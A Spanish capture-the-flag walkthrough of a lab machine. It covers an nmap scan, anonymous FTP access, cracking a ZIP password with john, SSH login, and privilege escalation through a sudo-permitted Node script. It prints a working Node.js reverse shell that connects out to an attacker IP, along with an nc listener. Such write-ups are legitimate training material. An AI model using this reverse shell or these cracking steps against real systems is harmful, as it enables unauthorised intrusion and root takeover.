![1](https://github.com/user-attachments/assets/e29678ab-1633-41fb-a33a-d4f28a13f1f2)

## Conectividad con la máquina objetivo

Vemos que al desplegar la máquina nos da una IP, así que hacemos un ping y comprobamos la conectividad.

![3](https://github.com/user-attachments/assets/1d28bf54-e8bd-46ae-9062-e4738a4d6173)

Hacemos ping y vemos que tenemos conectividad

![4](https://github.com/user-attachments/assets/7916527c-6dad-4ac6-8475-9640185f3380)

## Descubrimiento de Puertos y Servicios

Lanzo un escaneo con `nmap` y compruebo lo siguiente:

`nmap -p- -sS -sC -sV -O 172.17.0.2 -oN puertos.txt`

![2](https://github.com/user-attachments/assets/90d7d84b-f36e-489c-bfd0-c09dfd7f0040)

### Puertos y Servicios

| Puerto | Servicio | Versión       |
| ------ | -------- | ------------- |
| 21     | FTP      | Vsftpd 3.0.3  |
| 22     | SSH      | OpenSSH 9.2p1 |

## Fase de Explotación

Vemos que podemos entrar como **anonymous** en FTP y que hay un archivo ZIP. Nos los traemos a nuestra máquina con el comando get.

![5](https://github.com/user-attachments/assets/98e09495-9266-4e30-948e-78c3d23f5f2e)

Lo abrimos y a simple vista veo que hay un .txt con la clave para entrar por SSH.

![6](https://github.com/user-attachments/assets/fdd44f7c-1c61-4c85-a21d-e062b8335919)

Si lo intentamos extraer nos pide una clave, pero no la sabemos.

Podemos convertir el fichero a un hash para luego con john hacer fuerza bruta para sacar la clave del .zip.

`zip2jhon secretitopicaron.zip > secretitohash`

![7](https://github.com/user-attachments/assets/c24fa042-8fe4-4825-91bc-3d7ee84bc21b)

Ahora con `jhon` intentamos sacar la clave.

`john --format=PKZIP -w /usr/share/wordlist/rockyou.txt secretitohash`

![8](https://github.com/user-attachments/assets/15fde27b-146c-447b-a08e-b24b07bec44f)

Y vemos que la clave es *password1*

Lo intentamos extraer y vemos que si nos deja, abrimos el password.txt y sale esto.

![9](https://github.com/user-attachments/assets/ea94c6f6-0d28-4a20-8c50-fd8719b56677)

Por lo que entramos por SSH y vemos que podemos ejecutar como cualquier usuario el binario node pero solo el script que hay en /home/mario.

![10](https://github.com/user-attachments/assets/73d44641-685e-470c-8cac-e14340b92abd)

Si abrimos el script, vemos que está vacido. Podemos meter una reverse shell y ejecutarla como root para conseguir privilegios.

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(443, "192.168.1.246", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

En la máquina atacante, en nuestro kali, ejecutamos primero:

`nc -nlvp 443`

Y luego ejecutamos el script

Si se queda colgado y en nuestra máquina conseguimos la bash lo hemos hecho bien.

Ahora ejecutamos `whoami` y vemos que somos root.

![11](https://github.com/user-attachments/assets/f3281978-4be3-43ba-9f6f-5c2cec233b78)

Ya somos root!!
